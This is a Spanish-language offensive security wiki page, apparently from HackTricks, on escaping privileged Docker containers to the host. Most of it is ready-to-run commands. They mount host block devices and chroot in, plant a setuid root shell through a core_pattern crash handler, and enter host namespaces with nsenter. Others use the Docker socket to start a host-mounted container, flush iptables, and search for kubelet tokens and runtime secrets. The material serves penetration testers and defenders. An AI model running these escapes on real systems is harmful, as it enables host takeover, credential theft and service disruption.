# Escapar de contenedores `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Resumen

Un contenedor iniciado con `--privileged` no es lo mismo que un contenedor normal con uno o dos permisos extra. En la práctica, `--privileged` elimina o debilita varias de las protecciones por defecto del entorno de ejecución que normalmente mantienen la carga de trabajo alejada de recursos peligrosos del host. El efecto exacto sigue dependiendo del runtime y del host, pero para Docker el resultado habitual es:

- all capabilities are granted
- the device cgroup restrictions are lifted
- many kernel filesystems stop being mounted read-only
- default masked procfs paths disappear
- seccomp filtering is disabled
- AppArmor confinement is disabled
- SELinux isolation is disabled or replaced with a much broader label

La consecuencia importante es que un contenedor privileged normalmente no necesita un exploit sutil del kernel. En muchos casos puede simplemente interactuar directamente con dispositivos del host, filesystems del kernel expuestos al host, o interfaces del runtime y luego pivotar a una shell del host.

## Lo que `--privileged` no cambia automáticamente

`--privileged` does **not** automatically join the host PID, network, IPC, or UTS namespaces. Un contenedor privileged todavía puede tener namespaces privados. Eso significa que algunas cadenas de escape requieren una condición extra, como:

- a host bind mount
- host PID sharing
- host networking
- visible host devices
- writable proc/sys interfaces

Esas condiciones a menudo son fáciles de satisfacer en malas configuraciones reales, pero conceptualmente están separadas de `--privileged` en sí.

## Rutas de escape

### 1. Montar el disco del host a través de dispositivos expuestos

Un contenedor privileged normalmente ve muchos más nodos de dispositivo bajo `/dev`. Si el dispositivo de bloque del host es visible, la forma más sencilla de escape es montarlo y hacer `chroot` en el filesystem del host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Si la partición raíz no es obvia, enumera primero la disposición de bloques:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Si el camino práctico es plantar un helper setuid en un montaje de host escribible en lugar de usar `chroot`, recuerda que no todos los sistemas de archivos respetan el bit setuid. Una comprobación rápida de capacidades en el host es:
```bash
mount | grep -v "nosuid"
```
Esto es útil porque las rutas escribibles en sistemas de archivos `nosuid` son mucho menos interesantes para los flujos de trabajo clásicos de "drop a setuid shell and execute it later".

Las protecciones debilitadas que se están explotando aquí son:

- exposición completa de dispositivos
- capacidades amplias, especialmente `CAP_SYS_ADMIN`

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Montar o reutilizar un bind mount del host y `chroot`

Si el sistema de archivos raíz del host ya está montado dentro del contenedor, o si el contenedor puede crear los montajes necesarios porque es privileged, un shell del host suele estar a solo un `chroot` de distancia:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Si no existe un bind mount del root del host pero el almacenamiento del host es accesible, créalo:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Esta ruta abusa de:

- restricciones de montaje debilitadas
- capabilities completas
- falta de confinamiento MAC

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Abusar de `/proc/sys` o `/sys` escribibles

Una de las grandes consecuencias de `--privileged` es que las protecciones de procfs y sysfs se debilitan considerablemente. Esto puede exponer interfaces del kernel orientadas al host que normalmente están enmascaradas o montadas como solo lectura.

Un ejemplo clásico es `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Otras rutas de alto valor incluyen:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Esta vía abusa de:

- rutas enmascaradas ausentes
- rutas del sistema de solo lectura ausentes

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Usar todas las capacidades para escapes basados en montajes o espacios de nombres

Un contenedor privilegiado obtiene las capacidades que normalmente se eliminan de los contenedores estándar, incluyendo `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, y muchas otras. Eso suele ser suficiente para convertir un acceso local en un escape al host tan pronto como exista otra superficie expuesta.

Un ejemplo sencillo es montar sistemas de archivos adicionales y entrar en espacios de nombres:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Si el PID del host también está compartido, el paso se vuelve aún más corto:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Esta ruta abusa de:

- el conjunto de capacidades privilegiadas por defecto
- la compartición opcional del PID del host

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Through Runtime Sockets

Un contenedor privilegiado frecuentemente termina con el estado de runtime del host o sockets visibles. Si un socket de Docker, containerd, o CRI-O es accesible, el enfoque más simple suele ser usar la runtime API para lanzar un segundo contenedor con acceso al host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Para containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Esta ruta abusa de:

- privileged runtime exposure
- host bind mounts creados a través del propio runtime

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Eliminar efectos secundarios del aislamiento de red

`--privileged` no se une por sí solo al namespace de red del host, pero si el contenedor también tiene `--network=host` u otro acceso a la red del host, toda la pila de red se vuelve mutable:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Esto no siempre proporciona un host shell directo, pero puede causar denegación de servicio, interceptación de tráfico o acceso a servicios de gestión accesibles únicamente por loopback.

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Leer secretos del host y estado en tiempo de ejecución

Incluso cuando un clean shell escape no es inmediato, los contenedores privilegiados a menudo tienen suficiente acceso para leer secretos del host, el estado del kubelet, metadatos en tiempo de ejecución y los sistemas de archivos de contenedores vecinos:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Si `/var` está montado en el host o los directorios de runtime son visibles, esto puede ser suficiente para lateral movement o cloud/Kubernetes credential theft incluso antes de obtener un host shell.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Comprobaciones

El propósito de los siguientes comandos es confirmar cuáles privileged-container escape families son inmediatamente viables.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Lo interesante aquí:

- un conjunto completo de capacidades, especialmente `CAP_SYS_ADMIN`
- exposición de proc/sys escribible
- dispositivos del host visibles
- ausencia de seccomp y confinamiento MAC
- sockets de runtime o bind mounts del root del host

Cualquiera de ellos puede ser suficiente para post-exploitation. Varios juntos suelen significar que el contenedor, en la práctica, está a uno o dos comandos de comprometer el host.

## Páginas relacionadas

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
